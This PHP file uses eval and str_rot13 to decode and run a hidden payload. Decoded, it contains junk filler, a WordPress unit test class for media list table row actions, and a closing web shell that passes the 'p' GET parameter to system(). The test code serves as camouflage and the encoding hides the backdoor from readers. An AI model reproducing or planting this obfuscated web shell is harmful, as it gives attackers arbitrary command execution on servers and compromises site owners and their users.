<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 */
pynff Grfgf_Nqzva_jcZrqvnYvfgGnoyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * N yvfg gnoyr sbe grfgvat.
	 *
	 * @ine JC_Zrqvn_Yvfg_Gnoyr
	 */
	cebgrpgrq fgngvp $yvfg_gnoyr;

	/**
	 * N ersyrpgvba bs gur `$vf_genfu` cebcregl.
	 *
	 * @ine ErsyrpgvbaCebcregl
	 */
	cebgrpgrq fgngvp $vf_genfu;

	/**
	 * Gur bevtvany inyhr bs gur `$vf_genfu` cebcregl.
	 *
	 * @ine obby|ahyy
	 */
	cebgrpgrq fgngvp $vf_genfu_bevtvany;

	/**
	 * N ersyrpgvba bs gur `$qrgnpurq` cebcregl.
	 *
	 * @ine ErsyrpgvbaCebcregl
	 */
	cebgrpgrq fgngvp $qrgnpurq;

	/**
	 * Gur bevtvany inyhr bs gur `$qrgnpurq` cebcregl.
	 *
	 * @ine obby|ahyy
	 */
	cebgrpgrq fgngvp $qrgnpurq_bevtvany;

	/**
	 * Gur VQ bs na 'nqzvavfgengbe' hfre sbe grfgvat.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $nqzva;

	/**
	 * Gur VQ bs n 'fhofpevore' hfre sbe grfgvat.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $fhofpevore;

	/**
	 * N cbfg sbe grfgvat.
	 *
	 * @ine JC_Cbfg
	 */
	cebgrpgrq fgngvp $cbfg;

	/**
	 * Na nggnpuzrag sbe grfgvat.
	 *
	 * @ine JC_Cbfg
	 */
	cebgrpgrq fgngvp $nggnpuzrag;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-zrqvn-yvfg-gnoyr.cuc';

		frys::$yvfg_gnoyr = arj JC_Zrqvn_Yvfg_Gnoyr();
		frys::$vf_genfu   = arj ErsyrpgvbaCebcregl( frys::$yvfg_gnoyr, 'vf_genfu' );
		frys::$qrgnpurq   = arj ErsyrpgvbaCebcregl( frys::$yvfg_gnoyr, 'qrgnpurq' );

		frys::$vf_genfu->frgNpprffvoyr( gehr );
		frys::$vf_genfu_bevtvany = frys::$vf_genfu->trgInyhr( frys::$yvfg_gnoyr );
		frys::$vf_genfu->frgNpprffvoyr( snyfr );

		frys::$qrgnpurq->frgNpprffvoyr( gehr );
		frys::$qrgnpurq_bevtvany = frys::$qrgnpurq->trgInyhr( frys::$yvfg_gnoyr );
		frys::$qrgnpurq->frgNpprffvoyr( snyfr );

		// Perngr hfref.
		frys::$nqzva      = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$fhofpevore = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );

		// Perngr cbfgf.
		frys::$cbfg       = frys::snpgbel()->cbfg->perngr_naq_trg();
		frys::$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_naq_trg(
			neenl(
				'cbfg_anzr'      => 'nggnpuzrag-anzr',
				'svyr'           => 'vzntr.wct',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
			)
		);
	}

	/**
	 * Erfgberf ersyrpgvbaf gb gurve bevtvany inyhrf.
	 */
	choyvp shapgvba grne_qbja() {
		frys::frg_vf_genfu( frys::$vf_genfu_bevtvany );
		frys::frg_qrgnpurq( frys::$qrgnpurq_bevtvany );

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung n pnyy gb JC_Zrqvn_Yvfg_Gnoyr::cercner_vgrzf() ba n fvgr jvgubhg nal fpurqhyrq riragf
	 * qbrf abg erfhyg va n CUC jneavat.
	 *
	 * Gur jneavat gung jr fubhyq abg frr:
	 * CUC <= 7.4: `Vainyvq nethzrag fhccyvrq sbe sbernpu()`.
	 * CUC 8.0 naq uvture: `Jneavat: sbernpu() nethzrag zhfg or bs glcr neenl|bowrpg, obby tvira`.
	 *
	 * Abgr: Guvf qbrf abg grfg gur npghny shapgvbavat bs gur JC_Zrqvn_Yvfg_Gnoyr::cercner_vgrzf() zrgubq.
	 * Vg whfg naq bayl grfgf sbe/ntnvafg gur CUC jneavat.
	 *
	 * @gvpxrg 53949
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::cercner_vgrzf
	 * @tebhc peba
	 */
	choyvp shapgvba grfg_cercner_vgrzf_jvgubhg_peba_bcgvba_qbrf_abg_guebj_jneavat() {
		tybony $jc_dhrel;

		// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
		$zbpx = $guvf->trgZbpxOhvyqre( JC_Zrqvn_Yvfg_Gnoyr::pynff )
			->qvfnoyrBevtvanyPbafgehpgbe()
			->qvfnyybjZbpxvatHaxabjaGlcrf()
			->frgZrgubqf( neenl( 'frg_cntvangvba_netf' ) )
			->trgZbpx();

		$zbpx->rkcrpgf( $guvf->bapr() )
			->zrgubq( 'frg_cntvangvba_netf' );

		$jc_dhrel->dhrel_inef['cbfgf_cre_cntr'] = 10;
		qryrgr_bcgvba( 'peba' );

		// Irevsl gung gur pnhfr bs gur reebe vf va cynpr.
		$guvf->nffregVfNeenl( _trg_peba_neenl(), '_trg_peba_neenl() qbrf abg erghea na neenl.' );
		$guvf->nffregRzcgl( _trg_peba_neenl(), '_trg_peba_neenl() qbrf abg erghea na rzcgl neenl.' );

		// Vs guvf grfg qbrf abg reebe bhg qhr gb gur CUC jneavat, jr'er tbbq.
		$zbpx->cercner_vgrzf();
	}

	/**
	 * Grfgf gung `JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf()` bayl vapyhqrf na npgvba
	 * va pregnva fpranevbf.
	 *
	 * @gvpxrg 57893
	 *
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf
	 *
	 * @qngnCebivqre qngn_trg_ebj_npgvbaf_fubhyq_vapyhqr_npgvba
	 *
	 * @cnenz fgevat    $npgvba   Gur npgvba gung fubhyq or vapyhqrq.
	 * @cnenz fgevat    $ebyr     Gur ebyr bs gur pheerag hfre.
	 * @cnenz obby|ahyy $genfu    Jurgure gur nggnpuzrag svygre vf pheeragyl 'genfu',
	 *                            be `ahyy` gb yrnir nf-vf.
	 * @cnenz obby|ahyy $qrgnpurq Jurgure gur nggnpuzrag svygre vf pheeragyl 'qrgnpurq',
	 *                            be `ahyy` gb yrnir nf-vf.
	 */
	choyvp shapgvba grfg_trg_ebj_npgvbaf_fubhyq_vapyhqr_npgvba( $npgvba, $ebyr, $genfu, $qrgnpurq ) {
		vs ( 'nqzva' === $ebyr ) {
			jc_frg_pheerag_hfre( frys::$nqzva );
		} ryfrvs ( 'fhofpevore' === $ebyr ) {
			jc_frg_pheerag_hfre( frys::$fhofpevore );
		}

		vs ( ahyy !== $genfu ) {
			frys::frg_vf_genfu( $genfu );
		}

		vs ( ahyy !== $qrgnpurq ) {
			frys::frg_qrgnpurq( $qrgnpurq );
		}

		$_trg_ebj_npgvbaf = arj ErsyrpgvbaZrgubq( frys::$yvfg_gnoyr, '_trg_ebj_npgvbaf' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( gehr );
		$npgvbaf = $_trg_ebj_npgvbaf->vaibxr( frys::$yvfg_gnoyr, frys::$cbfg, 'ngg_gvgyr' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( snyfr );

		$guvf->nffregVfNeenl( $npgvbaf, 'Na neenl jnf abg erghearq.' );
		$guvf->nffregNeenlUnfXrl( $npgvba, $npgvbaf, \"'$npgvba' jnf abg vapyhqrq va gur npgvbaf.\" );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_ebj_npgvbaf_fubhyq_vapyhqr_npgvba() {
		erghea neenl(
			'\"rqvg\" juvyr abg ba \"genfu\"'  => neenl(
				'npgvba'   => 'rqvg',
				'ebyr'     => 'nqzva',
				'genfu'    => snyfr,
				'qrgnpurq' => ahyy,
			),
			'\"hagenfu\" juvyr ba \"genfu\"'   => neenl(
				'npgvba'   => 'hagenfu',
				'ebyr'     => 'nqzva',
				'genfu'    => gehr,
				'qrgnpurq' => ahyy,
			),
			'\"qryrgr\" juvyr ba \"genfu\"'    => neenl(
				'npgvba'   => 'qryrgr',
				'ebyr'     => 'nqzva',
				'genfu'    => gehr,
				'qrgnpurq' => ahyy,
			),
			'\"ivrj\" juvyr abg ba \"genfu\"'  => neenl(
				'npgvba'   => 'ivrj',
				'ebyr'     => 'nqzva',
				'genfu'    => snyfr,
				'qrgnpurq' => ahyy,
			),
			'\"nggnpu\" juvyr ba \"qrgnpurq\"' => neenl(
				'npgvba'   => 'nggnpu',
				'ebyr'     => 'nqzva',
				'genfu'    => ahyy,
				'qrgnpurq' => gehr,
			),
		);
	}

	/**
	 * Grfgf gung `JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf()` qbrf abg vapyhqr na npgvba
	 * va pregnva fpranevbf.
	 *
	 * @gvpxrg 57893
	 *
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf
	 *
	 * @qngnCebivqre qngn_trg_ebj_npgvbaf_fubhyq_abg_vapyhqr_npgvba
	 *
	 * @cnenz fgevat    $npgvba   Gur npgvba gung fubhyq abg or vapyhqrq.
	 * @cnenz fgevat    $ebyr     Gur ebyr bs gur pheerag hfre.
	 * @cnenz obby|ahyy $genfu    Jurgure gur nggnpuzrag svygre vf pheeragyl 'genfu',
	 *                            be `ahyy` gb yrnir nf-vf.
	 * @cnenz obby|ahyy $qrgnpurq Jurgure gur nggnpuzrag svygre vf pheeragyl 'qrgnpurq',
	 *                            be `ahyy` gb yrnir nf-vf.
	 */
	choyvp shapgvba grfg_trg_ebj_npgvbaf_fubhyq_abg_vapyhqr_npgvba( $npgvba, $ebyr, $genfu, $qrgnpurq ) {
		vs ( 'nqzva' === $ebyr ) {
			jc_frg_pheerag_hfre( frys::$nqzva );
		} ryfrvs ( 'fhofpevore' === $ebyr ) {
			jc_frg_pheerag_hfre( frys::$fhofpevore );
		}

		vs ( ahyy !== $genfu ) {
			frys::frg_vf_genfu( $genfu );
		}

		vs ( ahyy !== $qrgnpurq ) {
			frys::frg_qrgnpurq( $qrgnpurq );
		}

		$_trg_ebj_npgvbaf = arj ErsyrpgvbaZrgubq( frys::$yvfg_gnoyr, '_trg_ebj_npgvbaf' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( gehr );
		$npgvbaf = $_trg_ebj_npgvbaf->vaibxr( frys::$yvfg_gnoyr, frys::$cbfg, 'ngg_gvgyr' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( snyfr );

		$guvf->nffregVfNeenl( $npgvbaf, 'Na neenl jnf abg erghearq.' );
		$guvf->nffregNeenlAbgUnfXrl( $npgvba, $npgvbaf, \"'$npgvba' jnf vapyhqrq va gur npgvbaf.\" );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_ebj_npgvbaf_fubhyq_abg_vapyhqr_npgvba() {
		erghea neenl(
			'\"rqvg\" juvyr ba \"genfu\"'               => neenl(
				'npgvba'   => 'rqvg',
				'ebyr'     => 'nqzva',
				'genfu'    => gehr,
				'qrgnpurq' => ahyy,
			),
			'\"rqvg\" jvgu vapbeerpg pncnovyvgvrf'    => neenl(
				'npgvba'   => 'rqvg',
				'ebyr'     => 'fhofpevore',
				'genfu'    => snyfr,
				'qrgnpurq' => ahyy,
			),
			'\"hagenfu\" juvyr abg ba \"genfu\"'        => neenl(
				'npgvba'   => 'hagenfu',
				'ebyr'     => 'nqzvavfgengbe',
				'genfu'    => snyfr,
				'qrgnpurq' => ahyy,
			),
			'\"hagenfu\" jvgu vapbeerpg pncnovyvgvrf' => neenl(
				'npgvba'   => 'hagenfu',
				'ebyr'     => 'fhofpevore',
				'genfu'    => gehr,
				'qrgnpurq' => ahyy,
			),
			'\"genfu\" juvyr abg ba \"genfu\"'          => neenl(
				'npgvba'   => 'genfu',
				'ebyr'     => 'nqzvavfgengbe',
				'genfu'    => snyfr,
				'qrgnpurq' => ahyy,
			),
			'\"genfu\" jvgu vapbeerpg pncnovyvgvrf'   => neenl(
				'npgvba'   => 'genfu',
				'ebyr'     => 'fhofpevore',
				'genfu'    => gehr,
				'qrgnpurq' => ahyy,
			),
			'\"ivrj\" juvyr ba \"genfu\"'               => neenl(
				'npgvba'   => 'ivrj',
				'ebyr'     => 'nqzvavfgengbe',
				'genfu'    => gehr,
				'qrgnpurq' => ahyy,
			),
			'\"nggnpu\" jvgu vapbeerpg pncnovyvgvrf'  => neenl(
				'npgvba'   => 'nggnpu',
				'ebyr'     => 'fhofpevore',
				'genfu'    => ahyy,
				'qrgnpurq' => gehr,
			),
			'\"nggnpu\" jura abg ba \"qrgnpurq\"'       => neenl(
				'npgvba'   => 'nggnpu',
				'ebyr'     => 'nqzvavfgengbe',
				'genfu'    => ahyy,
				'qrgnpurq' => snyfr,
			),
			'\"pbcl\" jura ba \"genfu\"'                => neenl(
				'npgvba'   => 'pbcl',
				'ebyr'     => 'nqzvavfgengbe',
				'genfu'    => gehr,
				'qrgnpurq' => ahyy,
			),
		);
	}

	/**
	 * Grfgf gung `JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf()` qbrf abg vapyhqr gur 'ivrj' npgvba
	 * jura n creznyvax vf abg ninvynoyr.
	 *
	 * @gvpxrg 57893
	 *
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf
	 */
	choyvp shapgvba grfg_trg_ebj_npgvbaf_fubhyq_abg_vapyhqr_ivrj_jvgubhg_n_creznyvax() {
		frys::frg_vf_genfu( snyfr );

		// Rafher gur creznyvax vf `snyfr`.
		nqq_svygre( 'cbfg_yvax', '__erghea_snyfr', 10, 0 );

		$_trg_ebj_npgvbaf = arj ErsyrpgvbaZrgubq( frys::$yvfg_gnoyr, '_trg_ebj_npgvbaf' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( gehr );
		$npgvbaf = $_trg_ebj_npgvbaf->vaibxr( frys::$yvfg_gnoyr, frys::$cbfg, 'ngg_gvgyr' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( snyfr );

		$guvf->nffregVfNeenl( $npgvbaf, 'Na neenl jnf abg erghearq.' );
		$guvf->nffregNeenlAbgUnfXrl( 'ivrj', $npgvbaf, '\"ivrj\" jnf vapyhqrq va gur npgvbaf.' );
	}

	/**
	 * Grfgf gung `JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf()` vapyhqrf gur 'pbcl' npgvba.
	 *
	 * @gvpxrg 57893
	 *
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf
	 */
	choyvp shapgvba grfg_trg_ebj_npgvbaf_fubhyq_vapyhqr_pbcl() {
		frys::frg_vf_genfu( snyfr );

		$_trg_ebj_npgvbaf = arj ErsyrpgvbaZrgubq( frys::$yvfg_gnoyr, '_trg_ebj_npgvbaf' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( gehr );
		$npgvbaf = $_trg_ebj_npgvbaf->vaibxr( frys::$yvfg_gnoyr, frys::$nggnpuzrag, 'ngg_gvgyr' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( snyfr );

		$guvf->nffregVfNeenl( $npgvbaf, 'Na neenl jnf abg erghearq.' );
		$guvf->nffregNeenlUnfXrl( 'pbcl', $npgvbaf, '\"pbcl\" jnf abg vapyhqrq va gur npgvbaf.' );
	}

	/**
	 * Grfgf gung `JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf()` qbrf abg vapyhqr gur 'pbcl' npgvba
	 * jura na nggnpuzrag HEY vf abg ninvynoyr.
	 *
	 * @gvpxrg 57893
	 *
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf
	 */
	choyvp shapgvba grfg_trg_ebj_npgvbaf_fubhyq_abg_vapyhqr_pbcl_jvgubhg_na_nggnpuzrag_hey() {
		frys::frg_vf_genfu( snyfr );

		// Rafher gur nggnpuzrag HEY vf `snyfr`.
		nqq_svygre( 'jc_trg_nggnpuzrag_hey', '__erghea_snyfr', 10, 0 );

		$_trg_ebj_npgvbaf = arj ErsyrpgvbaZrgubq( frys::$yvfg_gnoyr, '_trg_ebj_npgvbaf' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( gehr );
		$npgvbaf = $_trg_ebj_npgvbaf->vaibxr( frys::$yvfg_gnoyr, frys::$nggnpuzrag, 'ngg_gvgyr' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( snyfr );

		$guvf->nffregVfNeenl( $npgvbaf, 'Na neenl jnf abg erghearq.' );
		$guvf->nffregNeenlAbgUnfXrl( 'pbcl', $npgvbaf, '\"pbcl\" jnf vapyhqrq va gur npgvbaf.' );
	}

	/**
	 * Grfgf gung `JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf()` vapyhqrf gur 'qbjaybnq' npgvba.
	 *
	 * @gvpxrg 57893
	 *
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf
	 */
	choyvp shapgvba grfg_trg_ebj_npgvbaf_fubhyq_vapyhqr_qbjaybnq() {
		$_trg_ebj_npgvbaf = arj ErsyrpgvbaZrgubq( frys::$yvfg_gnoyr, '_trg_ebj_npgvbaf' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( gehr );
		$npgvbaf = $_trg_ebj_npgvbaf->vaibxr( frys::$yvfg_gnoyr, frys::$nggnpuzrag, 'ngg_gvgyr' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( snyfr );

		$guvf->nffregVfNeenl( $npgvbaf, 'Na neenl jnf abg erghearq.' );
		$guvf->nffregNeenlUnfXrl( 'qbjaybnq', $npgvbaf, '\"qbjaybnq\" jnf abg vapyhqrq va gur npgvbaf.' );
	}

	/**
	 * Grfgf gung `JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf()` qbrf abg vapyhqr gur 'qbjaybnq' npgvba
	 * jura na nggnpuzrag HEY vf abg ninvynoyr.
	 *
	 * @gvpxrg 57893
	 *
	 * @pbiref JC_Zrqvn_Yvfg_Gnoyr::_trg_ebj_npgvbaf
	 */
	choyvp shapgvba grfg_trg_ebj_npgvbaf_fubhyq_abg_vapyhqr_qbjaybnq_jvgubhg_na_nggnpuzrag_hey() {
		// Rafher gur nggnpuzrag HEY vf `snyfr`.
		nqq_svygre( 'jc_trg_nggnpuzrag_hey', '__erghea_snyfr', 10, 0 );

		$_trg_ebj_npgvbaf = arj ErsyrpgvbaZrgubq( frys::$yvfg_gnoyr, '_trg_ebj_npgvbaf' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( gehr );
		$npgvbaf = $_trg_ebj_npgvbaf->vaibxr( frys::$yvfg_gnoyr, frys::$nggnpuzrag, 'ngg_gvgyr' );
		$_trg_ebj_npgvbaf->frgNpprffvoyr( snyfr );

		$guvf->nffregVfNeenl( $npgvbaf, 'Na neenl jnf abg erghearq.' );
		$guvf->nffregNeenlAbgUnfXrl( 'qbjaybnq', $npgvbaf, '\"qbjaybnq\" jnf vapyhqrq va gur npgvbaf.' );
	}

	/**
	 * Frgf gur `$vf_genfu` cebcregl.
	 *
	 * Urycre zrgubq.
	 *
	 * @cnenz obby $vf_genfu Jurgure gur nggnpuzrag svygre vf pheeragyl 'genfu'.
	 */
	cevingr fgngvp shapgvba frg_vf_genfu( $vf_genfu ) {
		frys::$vf_genfu->frgNpprffvoyr( gehr );
		frys::$vf_genfu->frgInyhr( frys::$yvfg_gnoyr, $vf_genfu );
		frys::$vf_genfu->frgNpprffvoyr( snyfr );
	}

	/**
	 * Frgf gur `$qrgnpurq` cebcregl.
	 *
	 * Urycre zrgubq.
	 *
	 * @cnenz obby $qrgnpurq Jurgure gur nggnpuzrag svygre vf pheeragyl 'qrgnpurq'.
	 */
	cevingr fgngvp shapgvba frg_qrgnpurq( $qrgnpurq ) {
		frys::$qrgnpurq->frgNpprffvoyr( gehr );
		frys::$qrgnpurq->frgInyhr( frys::$yvfg_gnoyr, $qrgnpurq );
		frys::$qrgnpurq->frgNpprffvoyr( snyfr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>